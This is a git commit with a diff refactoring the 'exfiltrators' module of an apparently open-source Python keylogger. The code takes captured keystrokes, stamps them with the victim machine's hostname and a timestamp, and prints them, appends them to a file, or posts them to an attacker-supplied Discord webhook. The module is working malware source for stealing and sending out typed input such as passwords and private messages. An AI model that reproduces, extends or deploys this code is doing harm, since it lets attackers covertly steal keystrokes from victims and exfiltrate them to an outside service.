ed01b4481bced040413a25e11039aaf9bda31f3b
EONRaider <livewire_voodoo@protonmail.com>
2021-10-10 11:38:14 -0300

    Refactor Exfiltrator
    The use of the logging library was replaced with
    a more simplified stamping of messages for
    exfiltration.
    
    - Moved the logic of "tag" to __init__
    - Consolidated "tag" and "data" properties into
    a single "report" property
    - Modified child-classes to conform to new
    interface and signatures

--- src/exfiltrators.py
+++ src/exfiltrators.py
@@ -6,36 +6,31 @@ __author__ = "EONRaider @ keybase.io/eonraider"
 import abc
 import aiohttp
 import asyncio
-import logging
+import platform
+from datetime import datetime
 from pathlib import Path
 
 from discord import Webhook, AsyncWebhookAdapter
 
-import reporting
 from keylogger import KeyLogger
 
 
 class Exfiltrator(abc.ABC):
     def __init__(self, keylogger: KeyLogger, tag: str):
         self.keylogger = keylogger
-        self.keylogger.register_exfiltrator(exfiltrator=self)
-        self.tag = tag
-        self.logger = reporting.set_logger(name=self.tag)
+        self.keylogger.register_exfiltrator(self)
+        self.tag = tag if tag is not None else \
+            f"{self.keylogger.__class__.__name__}::" \
+            f"{self.__class__.__name__}::" \
+            f"{platform.node()}"
 
     @property
-    def tag(self) -> str:
-        return self._tag
-
-    @tag.setter
-    def tag(self, tag_name: str) -> None:
-        self._tag = f"{self.keylogger.__class__.__name__}::" \
-                    f"{self.__class__.__name__}"
-        if tag_name is not None:
-            self._tag += f"::{tag_name}"
-
-    @property
-    def data(self):
-        return str(self.keylogger)
+    def report(self) -> str:
+        timestamp = datetime.now().strftime("%m/%d/%Y %H:%M:%S")
+        header = f"[{self.tag}] @ {timestamp}"
+        if self.keylogger.has_data:
+            return f"{header} - {self.keylogger.contents}"
+        return f"{header} - <NO INPUT>"
 
     @abc.abstractmethod
     def update(self, *args, **kwargs):
@@ -43,12 +38,13 @@ class Exfiltrator(abc.ABC):
 
 
 class Screen(Exfiltrator):
-    def __init__(self, *, keylogger: KeyLogger, tag: str = None):
+    def __init__(self, *,
+                 keylogger: KeyLogger,
+                 tag: str = None):
         super().__init__(keylogger, tag)
 
-    def update(self):
-        self.logger.info(self.data if len(self.data) > 0 else "<NO INPUT>")
-        print(reporting.get_logs())
+    def update(self) -> None:
+        print(self.report)
 
 
 class TextFile(Exfiltrator):
@@ -59,11 +55,10 @@ class TextFile(Exfiltrator):
         super().__init__(keylogger, tag)
         self.file_path = file_path
 
-    def update(self):
-        if len(self.data) > 0:
-            self.logger.info(self.data)
+    def update(self) -> None:
+        if self.keylogger.has_data:
             with open(file=self.file_path, mode="a", encoding="utf_8") as file:
-                file.write(reporting.get_logs())
+                file.write(f"{self.report}\n")
 
 
 class Discord(Exfiltrator):
@@ -73,17 +68,14 @@ class Discord(Exfiltrator):
                  webhook_url: str):
         super().__init__(keylogger, tag)
         self.webhook_url = webhook_url
-        # Prevent asyncio and webhook from spamming the logs
-        for logger in "asyncio", "discord.webhook":
-            logging.getLogger(logger).setLevel(logging.CRITICAL)
 
     def update(self) -> None:
-        if len(self.data) > 0:
-            self.logger.info(self.data)
+        if self.keylogger.has_data:
             asyncio.run(self.send_message())
 
     async def send_message(self) -> None:
         async with aiohttp.ClientSession() as session:
             webhook = Webhook.from_url(url=self.webhook_url,
                                        adapter=AsyncWebhookAdapter(session))
-            await webhook.send(content=reporting.get_logs(), username=self.tag)
+            await webhook.send(content=self.report,
+                               username=self.keylogger.__class__.__name__)
